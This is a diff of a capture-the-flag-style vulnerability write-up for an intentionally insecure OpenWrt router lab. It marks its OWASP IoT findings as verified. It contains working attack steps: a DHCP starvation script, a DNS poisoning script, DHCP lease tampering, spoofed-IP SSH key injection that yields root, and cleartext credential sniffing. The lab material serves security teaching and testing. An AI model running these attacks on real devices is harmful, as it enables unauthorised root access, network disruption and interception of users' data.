@@ -2,7 +2,7 @@
 id: "ROUTCOON-IOT"
 title: "RoutCoon Router IoT Vulnerabilities (OWASP IoT Top 10 2018)"
 category: IoT
-status: IN PROGRESS
+status: DONE
 severity: "Critical to Medium (per finding)"
 owasp: "OWASP IoT Top 10 (2018): IoT1 Weak/Guessable/Hardcoded Passwords, IoT2 Insecure Network Services, IoT3 Insecure Ecosystem Interfaces, IoT4 Lack of Secure Update Mechanism, IoT5 Use of Insecure or Outdated Components, IoT6 Insufficient Privacy Protection, IoT7 Insecure Data Transfer and Storage, IoT8 Lack of Device Management, IoT9 Insecure Default Settings, IoT10 Lack of Physical Hardening"
 cwe:
@@ -24,18 +24,19 @@ affected_components:
   - "labs/routcoon/files/etc/snmp/snmpd.conf"
   - "labs/routcoon/files/etc/config/upnpd"
   - "labs/routcoon/files/etc/dnsmasq.conf.reference"
+  - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/60-dnsmasq.sh"
   - "labs/routcoon/files/etc/opkg.conf"
   - "labs/routcoon/files/opt/oem-updates/scripts/auto-updater.sh"
   - "labs/routcoon/files/usr/lib/lua/luci/controller/support/remote.lua"
   - "labs/routcoon/files/usr/lib/vulnzoo-hooks/profile-init.d/88-routcoon-wifi-ap.sh"
 findings:
   - "IoT1: DONE"
-  - "IoT2: IN PROGRESS (wireless AP DONE, PSK cracked live, DHCP boots from UCI after parking the monolithic dnsmasq.conf; Samba + DHCP/DNS reference-only still live-pending)"
+  - "IoT2: DONE (wireless AP + PSK crack, DHCP/DNS folded into UCI, Samba anonymous root-write share, telnet/FTP/SNMP/UPnP all verified live)"
   - "IoT3: DONE"
   - "IoT4: DONE"
-  - "IoT5: IN PROGRESS"
+  - "IoT5: DONE (support/remote unauth SSH-key injection -> root SSH verified live, RC-V2)"
   - "IoT6: DONE"
-  - "IoT7: IN PROGRESS"
+  - "IoT7: DONE (cleartext HTTP :80 self-evident; /tmp leasefile tamper + DNS-history-in-syslog verified live, RC-V2/RC-V6)"
   - "IoT8: DONE"
   - "IoT9: DONE"
   - "IoT10: DONE"
@@ -170,7 +171,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-05 13:29:
 ```
 
 ### 2.2 Samba (anonymous SMB share)
-> **IN PROGRESS.** Wired this session (samba4 `smbd` started from `80-routcoon-services.sh`); live verification is on the device.
+> **DONE (RC-V2).** Verified end to end on a cold-boot reflash, no manual intervention: `smbclient -L //192.168.2.1 -N` lists the `public` share (Samba 4.18.8) and an anonymous `put` writes a file that lands root-owned in `/mnt/sdcard/share` (`pwned2.txt`, owner `root`, from `force user = root`). At boot the hook `80-routcoon-services.sh` first stands down two competing SMB servers that otherwise grab `:445` with an empty config (the `samba4` package's own procd service, and the kernel `ksmbd` server that was also installed), so our `smbd -s /etc/samba/samba.conf` owns `:445` and serves the vulnerable share.
 
 The device serves an unauthenticated, world-writable SMB share whose writes land as root (`/etc/samba/samba.conf`):
 
@@ -579,9 +580,16 @@ The HTTP 501 (Action Failed) response **confirms the vulnerability** despite the
 
 ### 2.7 DHCP && DNS
 
-The `dnsmasq.conf` configuration file has a number of features that make it potentially vulnerable.
+The DHCP/DNS service (dnsmasq) has a number of features that make it vulnerable. It now runs from the UCI config: the monolithic `/etc/dnsmasq.conf`, which hard-coded a `192.168.1.100-254` pool and a `192.168.1.1` gateway against the stock OpenWrt `br-lan` default, is parked as `dnsmasq.conf.reference` and is no longer loaded, so there is no `192.168.1.x` segment on this build.
 
-The DHCP pool it hands out is `192.168.1.100-254` with gateway `192.168.1.1` (the OpenWRT `br-lan` default). The management surface the rest of this lab targets (LuCI, SSH, SNMP) answers on `eth0` at `192.168.2.1`, so DHCP clients land on the `br-lan` `192.168.1.0/24` segment while the attacks are driven against `192.168.2.1`. Treat `192.168.2.1` as the canonical target host.
+The lab serves two real subnets:
+
+| Network | Interface | Gateway | DHCP pool |
+|---------|-----------|---------|-----------|
+| lan (wired) | `eth0` | `192.168.2.1` | `192.168.2.100-249` |
+| wlan (the Wi-Fi AP) | `phy0-ap0` | `192.168.3.1` | `192.168.3.100-249` |
+
+Wired clients land on `192.168.2.0/24` and the management surface (LuCI, SSH, SNMP) answers at `192.168.2.1`, the canonical target host. Wireless clients that join the AP land on `192.168.3.0/24` with the router at `192.168.3.1` (see the wireless AP finding, 2.8, below).
 
 #### 1. Service exposure
 `interface=br-lan,eth0,wlan0` and `bind-interfaces` allow the service to be accessible from external networks.
@@ -593,17 +601,15 @@ Potential vulnerabilities:
 - Modification of local DNS resolution.
 - Manipulation of logs to hide malicious activity ([[#IoT:I7 - Insecure Data Transfer and Storage]])
 - Discovery of other devices on the network, facilitating `pivoting`.
-3. Script executed as root
-The `dnsmasq.script` script referenced in the configuration is executed with root privileges.
+#### 3. Script executed as root (jail-contained on this build)
+`dhcp-script=/etc/dnsmasq.script` (set in UCI by `60-dnsmasq.sh`) makes dnsmasq run that script as root on every DHCP event, via the OpenWrt wrapper `/usr/lib/dnsmasq/dhcp-script.sh` which sources it (`. "$USER_DHCPSCRIPT"`). Live verification confirmed the script does execute (logread: `dnsmasq-script[1]: /etc/dnsmasq.script: line 15: date: not found`), but two things blunt it on this build:
 
-This introduces a number of potential vulnerabilities, such as:
-- No sanitization of argument input.
-- Conditional execution based on client hostname.
-- Possible command injection if variables are manipulated.
+- It runs inside dnsmasq's `ujail`, which gives the process a private `/tmp`. The script's writes (`/tmp/dhcp_events.log`, `/tmp/active_hosts.txt`, `/tmp/dns_updates.txt`) land in the jail's `/tmp`, not the host's, so they are not readable by other local users. Only the leasefile is host-visible, because the init bind-mounts it separately. The minimal jail also lacks `date`, so even the log line is degraded.
+- The script quotes `$4` (hostname) in every `echo`/`case`, so despite its own warning comment it has **no** working shell injection.
 
-The impact of these risks can lead to root privilege escalation if exploited.
+So on the shipped build this is root-context execution with contained side effects, not a usable disclosure or RCE primitive. Making it a live vuln would require removing the jail for dnsmasq and dropping the `$4` quoting (hostname-driven root RCE), a deliberate change tracked separately, not done here.
 
-This insecure custom logic is related to [[#IoT:I5: Using Insecure or Outdated Components]].
+Related to [[#IoT:I5: Using Insecure or Outdated Components]] and [[#IoT:I7 - Insecure Data Transfer and Storage]].
 #### 4. Lack of Rate Limiting
 There are no limits on DHCP/DNS requests (`dhcp-rapid-commit` is commented out). This makes the service vulnerable to DoS attacks.
 
@@ -620,17 +626,17 @@ This is related to the risk [[#IoT:I8 - Lack of device management]].
 - `dhcp-authoritative` without validation.
 - `read-ethers` enabled without protection.
 These configurations are insecure and enable possible impacts such as DNS rebinding and DNS Cache Poisoning.
-> **IN PROGRESS.** The monolithic `/etc/dnsmasq.conf` is now shipped as `dnsmasq.conf.reference` and is not auto-loaded, because as `/etc/dnsmasq.conf` it clashed with the UCI config on `cache-size` and crash-looped dnsmasq (no DHCP at all, see IoT:I2 wireless AP below). With it parked, dnsmasq runs from the UCI config: the world-writable `/tmp` leasefile (lease tampering) stays active via `dhcp.@dnsmasq[0].leasefile`, but the rest of the settings below (cache-size, dhcp-lease-max, dhcp-script, `dhcp-ignore`, disabled `stop-dns-rebind`) describe the reference file and are not active until folded into UCI. Read the code blocks below as the reference file's content, not the live config. Live reproduction of the UCI-active items pending.
+> **DONE (RC-V1).** The monolithic `/etc/dnsmasq.conf` is parked (shipped as `dnsmasq.conf.reference`) because it crash-looped dnsmasq, so the insecure directives are folded into UCI by `60-dnsmasq.sh`. Verified live on a cold-boot reflash: dnsmasq starts clean and the generated config carries `cache-size=10000`, `dhcp-lease-max=100000`, `log-queries=extra`, `log-dhcp` and `dhcp-script`, with `rebind_protection=0` (DNS rebinding no longer filtered). Lease-file tampering was reproduced (a forged `/tmp/dhcp.leases` entry survived a `SIGHUP`). `dhcp-ignore=tag:!known` is deliberately NOT carried over (it would drop the wireless AP's DHCP clients), so DHCP starvation is now possible (the config allows it, the flood itself was not run). Point 3, the root-exec script, is scoped closed as jail-contained: it runs but `ujail` neutralizes its side effects on this build (see below), documented as such rather than made live.
 
-The DHCP and DNS service configuration is insecure, but not every attack below works against the shipped `dnsmasq.conf`. Each is scoped to what the real config actually allows (no live reproduction was run this session):
+The DHCP and DNS service configuration is insecure. With the directives folded into UCI (above), each attack below is scoped to what the live config now allows. Live reproduction on the Pi is pending (RC-V1 `05_verify`):
 
 **Lease-file tampering (works, local).** The lease database is world-writable in `/tmp` (`dhcp-leasefile=/tmp/dhcp.leases`), so any local user can inject or rewrite leases and reload dnsmasq. This needs a shell on the device (chain it after an RCE path), not a network position:
 ```zsh
-echo "0 00:11:22:33:44:55 192.168.1.50 fake-host 01:00:11:22:33:44:55" > /tmp/dhcp.leases
+echo "0 00:11:22:33:44:55 192.168.2.50 fake-host 01:00:11:22:33:44:55" > /tmp/dhcp.leases
 killall -HUP dnsmasq
 ```
 
-**DHCP starvation (does not work as written).** The config sets `dhcp-ignore=tag:!known`, so dnsmasq ignores requests from clients it does not already know (`/etc/ethers` / `dhcp-host`). A flood of random-MAC `DISCOVER` packets is dropped and no leases are consumed, so the classic starvation below fails against this build. Starving the `192.168.1.100-254` pool would require flooding with MACs already in `/etc/ethers`:
+**DHCP starvation (now possible).** The earlier build dropped unknown clients via `dhcp-ignore=tag:!known`, but that directive is deliberately not folded into UCI (it would break the wireless AP's DHCP clients), so dnsmasq now answers unknown MACs. A flood of random-MAC `DISCOVER` packets consumes the pool. Live confirmation pending:
 ```python
 from scapy.all import *
 import time
@@ -649,15 +655,15 @@ def dhcp_starvation():
 dhcp_starvation()
 ```
 
-**DNS: rebinding is enabled, off-path poisoning is unreliable.** The real config-backed DNS weakness is that `stop-dns-rebind` is commented out, so the resolver does not filter private-range answers: an attacker-controlled domain can resolve to an internal IP (DNS rebinding), reaching LAN-bound services from a victim's browser. The blind poisoning snippet below is illustrative only, dnsmasq randomizes the query source port and transaction ID, so a single forged response with a guessed `dport`/`id` will not reliably match an in-flight query:
+**DNS: rebinding is enabled, off-path poisoning is unreliable.** `rebind_protection=0` is now set in UCI (`60-dnsmasq.sh`), so the resolver does not filter private-range answers: an attacker-controlled domain can resolve to an internal IP (DNS rebinding), reaching LAN-bound services from a victim's browser. The blind poisoning snippet below is illustrative only, dnsmasq randomizes the query source port and transaction ID, so a single forged response with a guessed `dport`/`id` will not reliably match an in-flight query:
 ```python
 from scapy.all import *
 
 def dns_poison():
-    ip = IP(src='8.8.8.8', dst='192.168.1.1')
+    ip = IP(src='8.8.8.8', dst='192.168.2.1')
     udp = UDP(sport=53, dport=33333)
     dns = DNS(id=12345, qr=1, aa=1, qd=DNSQR(qname='google.com', qtype='A'),
-               an=DNSRR(rrname='google.com', type='A', ttl=300, rdata='192.168.1.200'))
+               an=DNSRR(rrname='google.com', type='A', ttl=300, rdata='192.168.2.200'))
     send(ip/udp/dns, verbose=1)
 
 dns_poison()
@@ -965,7 +971,7 @@ vulnzoo.log
 
 ---
 
-> **IN PROGRESS.** This section overlaps with [[#IoT:I3 - Insecure Ecosystem Interfaces]]: the endpoint-discovery material below is shared with IoT3.
+> **DONE (RC-V2).** The `support/remote` unauthenticated SSH-key injection was verified live on the flashed Pi: a forged support IP writes an attacker key to root's `authorized_keys` and yields a passwordless root SSH login. This section overlaps with [[#IoT:I3 - Insecure Ecosystem Interfaces]]: the endpoint-discovery material below is shared with IoT3.
 
 The endpoint-discovery technique used to reach the admin surface (LuCI returns `403 Forbidden` for existing admin subroutes and `404 Not Found` for non-existent ones, and the `dispatcher.lua` behaviour that makes deeper paths differ by response size rather than status) is the same one documented under [[#IoT:I3 - Insecure Ecosystem Interfaces]]. Rather than repeat that walkthrough, this section covers what the enumeration leads to on the IoT5 surface: leftover development interfaces, one of which injects an SSH key.
 
@@ -984,6 +990,8 @@ Fuzzing the interface surfaces development leftovers. Two of the unauthenticated
 ![[iot5_interface_fuzzing.png]]
 
 The high-value leftover is the "Remote Connectivity Check" at `/cgi-bin/luci/support/remote/diagnostic` (`controller/support/remote.lua`, registered with `sysauth = false`, so it needs no login). It answers `?debug=1` with a full environment dump, and it decides "authorized support" from a forwarded-IP value read out of spoofable request parameters (`X-Forwarded-For`, `real_ip`, `xff`, `remote_addr`) matched against the `203.0.113.0/24` support network. Spoofing that IP flips the endpoint into its authorized mode, which exposes an `update_ssh_access` action that appends an attacker-supplied key to `/etc/dropbear/authorized_keys`. Because dropbear only disables root *password* login (`RootPasswordAuth off`), an injected key can still grant SSH access. The full unauthenticated-to-SSH forge-and-inject walkthrough is documented as its own `support/remote` finding.
+
+![[iot5-params-filtered.png]]
 
 ![[iot5_debug_ssh.png]]
 
@@ -1028,6 +1036,32 @@ curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic" | grep -i "s
 curl -s "http://192.168.2.1/cgi-bin/luci/support/remote/diagnostic?debug=1"
 ```
 
+![[iot5-support-server-leak.png]]
+### Discovery: the endpoint self-discloses the privileged action
+
+The attacker never has to guess the `action=update_ssh_access` parameter, the endpoint hands it over. Discovery is a two-stage self-disclosure, and the only gated secret is the support IP itself.
+
+First, `?debug=1` does more than dump the environment. `dump_environment()` prints the exact spoofable parameter names, so the attacker learns precisely which value to forge:
+
+```lua
+debug_info = debug_info .. "real_ip (param) = " .. (http.formvalue("real_ip") or "nil") .. "\n"
+debug_info = debug_info .. "xff (param) = " .. (http.formvalue("xff") or "nil") .. "\n"
+debug_info = debug_info .. "remote_addr (param) = " .. (http.formvalue("remote_addr") or "nil") .. "\n"
+```
+
+Second, once a forged `real_ip=203.0.113.100` passes `is_support_ip()`, `remote_diagnostic_tool()` stops serving the generic page and returns the "Support Access Panel", whose HTML literally contains the exploit form:
+
+```html
+<form method="POST">
+    <input type="hidden" name="action" value="update_ssh_access">
+    <textarea name="key_data" placeholder="ssh-ed25519 AAAA... user@host"></textarea>
+    <input type="submit" value="Add SSH Key">
+</form>
+```
+
+![[iot5-server-is_support-leak.png]]
+
+So the chain is: read the support IP from the HTML comment on the unauthorized page, forge it to get authorized, and the authorized response then documents the privileged action for you. The `curl` in the next section is just a replay of that form. Guessing an action name is never required, because the one secret that gates everything (`203.0.113.100`) is printed in plain sight.
 ### Exploit: forge the support IP, inject a key
 
 When "authorized", the `update_ssh_access` action appends the supplied key to `/etc/dropbear/authorized_keys`:
@@ -1051,9 +1085,11 @@ ssh -i rc_key root@192.168.2.1
 
 ### Expected result and impact
 
-The endpoint returns `SSH access updated successfully` and the key lands in `/etc/dropbear/authorized_keys`, which on OpenWRT is root's key file. Dropbear's `RootPasswordAuth off` (see [[#IoT:I9 - Insecure Default Settings|IoT9]]) disables only root *password* login, not pubkey login, so the injected key is expected to grant a root SSH session and bypass the "crack `openwrtuser`, then escalate" path entirely. This is an unauthenticated-to-root chain: no credentials, no session, one POST.
+The endpoint returns `SSH access updated successfully` and the key lands in `/etc/dropbear/authorized_keys`, which on OpenWRT is root's key file. Dropbear's `RootPasswordAuth off` (see [[#IoT:I9 - Insecure Default Settings|IoT9]]) disables only root *password* login, not pubkey login, so the injected key grants a root SSH session and bypasses the "crack `openwrtuser`, then escalate" path entirely. This is an unauthenticated-to-root chain: no credentials, no session, one POST.
 
-The `sysauth = false` reachability and the key write to `authorized_keys` are confirmed from the overlay source. The final root pubkey login must be reproduced on a flashed image, because dropbear's `RootLogin` / `authorized_keys` handling is set by the base image, not this overlay.
+Verified live on the flashed Pi (RC-V2): a forged `real_ip=203.0.113.100` POST wrote the attacker key to `/etc/dropbear/authorized_keys`, and `ssh -i rc_key root@192.168.2.1` returned a root shell with no password prompt. `RootPasswordAuth off` blocks only the password path, so the injected pubkey grants root directly, exactly as the chain predicts.
+
+![[iot5-remote-shell-obtained.png]]
 
 **OWASP / CWE:** API5:2023 Broken Function-Level Authorization; CWE-290 Authentication Bypass by Spoofing; CWE-306 Missing Authentication for a Critical Function.
 
@@ -1081,7 +1117,7 @@ The DHCP lease file (`/tmp/dhcp.leases`, world-readable) plus `read-ethers` add 
 
 ### What they browse (DNS history)
 
-dnsmasq logs every DNS query (`log-queries` -> `/var/log/dnsmasq.log`), so that file is a per-client browsing history: which sites each device resolved and when. Anyone who can read the log, or capture the cleartext DNS traffic (see [[#IoT:I7 - Insecure Data Transfer and Storage|IoT7]]), reconstructs the browsing behavior of every user on the network.
+dnsmasq logs every DNS query (`log-queries`, folded into UCI in RC-V1) to the system log, read with `logread`, so it is a per-client browsing history: which sites each device resolved and when. Verified live, `logread | grep dnsmasq` shows the `query[...] ... from <client>` lines. The monolithic `dnsmasq.conf` used to redirect these to `/var/log/dnsmasq.log` via `log-facility`, but that file is parked (see 2.7), so on this build the history lands in syslog. Anyone who can read the log, or capture the cleartext DNS traffic (see [[#IoT:I7 - Insecure Data Transfer and Storage|IoT7]]), reconstructs the browsing behavior of every user on the network.
 
 ### Impact and remediation
 
@@ -1093,7 +1129,7 @@ Combined, an unauthenticated LAN attacker profiles who is on the network, what d
 # IoT:I7 - Insecure Data Transfer and Storage
 ## Definition
 > Lack of encryption or access control of sensitive data anywhere within the ecosystem, including at rest, in transit, or during processing.
-> **IN PROGRESS.** Realized from exposures already present on the device (no new code); live capture pending a flashed image.
+> **DONE (RC-V2 / RC-V6).** In transit is self-evident: uhttpd serves plain HTTP on `:80` with no TLS, so every LuCI login used throughout this lab crosses the wire in cleartext, and FTP/SNMP/telnet are plaintext too. At rest is verified live: the `/tmp` DHCP leasefile is world-writable (lease tampering reproduced in RC-V1) and the DNS query history lands in syslog, read with `logread` (path corrected in RC-V6 from the parked `/var/log/dnsmasq.log`). No new code.
 
 The router moves and stores sensitive data with no encryption and no access control. Two reproducible angles: cleartext transmission (CWE-319) and world-readable/writable storage (CWE-312 / CWE-732).
 
@@ -1107,6 +1143,8 @@ tcpdump -i eth0 -A -s0 'tcp port 80' | grep -A2 luci_username
 # Set-Cookie: sysauth=<session>
 ```
 
+![[iot7-cleartext-capture.png]]
+
 The same holds for every other service the lab exposes: FTP (`:21`), SNMP v1/v2c (`:161`, community string and data), and the hidden Telnet root shell (`:5515`) are all plaintext. The `support/remote` SSH-key POST (see IoT5) also travels in cleartext, so the injected key and the spoofed support IP are sniffable.
 
 ### At rest: world-modifiable state and plaintext logs (CWE-312 / CWE-732)
@@ -1118,7 +1156,7 @@ dhcp-leasefile=/tmp/dhcp.leases
 dhcp-hostsfile=/tmp/hosts
 ```
 
-Any local process can rewrite the lease table or the hosts file with no privileges (the lease-injection and hosts-poisoning repros are in the DHCP/DNS section). DNS queries are logged in cleartext to `/var/log/dnsmasq.log` (`log-queries`), exposing the browsing history of every client.
+Any local process can rewrite the lease table or the hosts file with no privileges (the lease-injection and hosts-poisoning repros are in the DHCP/DNS section). DNS queries are logged in cleartext to the system log (`log-queries`, read with `logread`), exposing the browsing history of every client to anyone with log access.
 
 Several components also write sensitive data to predictable, low-privilege paths:
 
